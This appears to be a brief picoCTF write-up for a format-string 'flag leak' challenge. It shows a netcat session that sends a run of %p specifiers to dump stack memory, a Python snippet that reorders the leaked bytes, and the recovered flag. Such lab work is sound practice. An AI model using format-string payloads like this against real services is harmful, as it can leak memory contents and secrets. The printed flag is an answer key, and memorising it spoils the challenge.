## Objetivo
Story telling class 1/2

Additional details will be available after launching your challenge instance
## Solución
```
┌──(kali㉿Franco)-[~/picoCTF/binexp1/flagleak]
└─$ nc saturn.picoctf.net 56463
Tell me a story and then I'll tell you one >> %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Here's a story - 
0xffbb1ab00xffbb1ad00x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x395f6b630x303666350x7d3731360xfbad20000x7622100(nil)0xec51c9900x804c0000x8049410(nil)0x804c0000xffbb1b980x80494180x20xffbb1c440xffbb1c50(nil)0xffbb1bb0(nil)(nil)0xec312ed5

python 
str = "ocip{FTCk43L_gn1g4lFff0_4tS_9_kc06f5}716" 
n = 4

nstr = ""
for i in range(0,len(str),n):
        s=str[i:i+n]
        nstr+=s[::-1]

print(nstr)


picoCTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}

```
## Notas adicionales

## Referencias